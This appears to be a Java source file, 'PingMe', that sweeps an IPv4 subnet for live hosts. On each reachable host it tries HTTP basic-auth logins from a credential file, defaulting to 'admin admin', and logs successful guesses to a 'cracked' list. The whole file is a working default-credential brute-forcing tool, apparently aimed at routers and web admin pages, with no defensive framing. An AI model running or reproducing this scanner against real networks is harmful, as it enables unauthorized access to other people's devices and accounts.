package ru.cadmy.network;

import org.apache.log4j.*;

import java.io.*;
import java.net.*;
import java.util.*;

public class PingMe {

    static final Logger reachableList = Logger.getLogger("reachableLogger");
    static final Logger crackedList = Logger.getLogger("crackedLogger");

	private final static String CREDITIANLS_LIST = "creditianls.txt";
	private final static String DEFAULT_CREDITIANLS = "admin admin";
	
	public static void main(String[] args){

        String log4jConfPath = "log4j.properties";
        PropertyConfigurator.configure(log4jConfPath);

		ArrayList<String> credits = loadCredentials();
		if (args.length > 0) {
			String ip = args[0];
			String[] parts = ip.split("\\.");
			int last = 0;
			StringBuilder first = new StringBuilder();
			try {
				first.append(parts[0]);
				first.append(".");
				first.append(parts[1]);
				first.append(".");
				first.append(parts[2]);
				first.append(".");
				last = Integer.valueOf(parts[3]);
			} catch (NumberFormatException e) {
				System.out.println("You should provide valid ip of the following format \"255.255.255.255\"");
			}
				
			InetAddress inet = null;
			String t = "255.255.255.255";
			String [] pair = null;
			for (int i=last; i<256; i++)
			{
				t =  first.toString() + i;
				System.out.println("Analyzing " + t);
				try {
					inet = InetAddress.getByName(t);
					if (inet.isReachable(2000)) {
                        System.out.println(t + " reached");
                        reachableList.trace(t);
						for  (String str : credits)
						{
							pair  = str.split(" ");
							System.out.println(" - " + t + " \"" + pair[0] + "\" \"" + pair[1] + "\"");
							if (login(t, pair[0], pair[1]) == true) {
                                crackedList.trace(t + " " + pair[0] + " " + pair[1]);
								break;
							}	
						}
					}
				} catch (UnknownHostException e) {
					System.out.println(" Invalid ip");
				} catch (IOException e) {
					System.out.println(" Invalid ip");
				}
			}	
		}
	}

	private static ArrayList<String> loadCredentials() {
        
        String line = null;
        ArrayList<String> credentials = new ArrayList<>();
		try {

            FileReader fileReader = 
                new FileReader(CREDITIANLS_LIST);

            BufferedReader bufferedReader = 
                new BufferedReader(fileReader);

            while((line = bufferedReader.readLine()) != null) {
                credentials.add(line);
            }   

            bufferedReader.close(); 
            
            return credentials;
        } catch(IOException e) {
            credentials.add(DEFAULT_CREDITIANLS);
        	return credentials;
        } 
		
	}

	private static boolean login(String ip, String login, String password) throws ProtocolException {	
		try {		
			Authenticator.setDefault (new Authenticator() {
			    protected PasswordAuthentication getPasswordAuthentication() {
			        return new PasswordAuthentication (login, password.toCharArray());
			    }
			});
			URL url = new URL("http://" + ip);
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			Scanner scanner = new Scanner(connection.getInputStream());
			scanner.useDelimiter("\\Z");
            //TODO 213.180.193.3 check both with router and site
            if (scanner.hasNext())
            {
                scanner.next();
            }
		} catch (ProtocolException e) {
			return false;
		} catch (IOException e) {
			return false;
		}
		return true;
	}

}
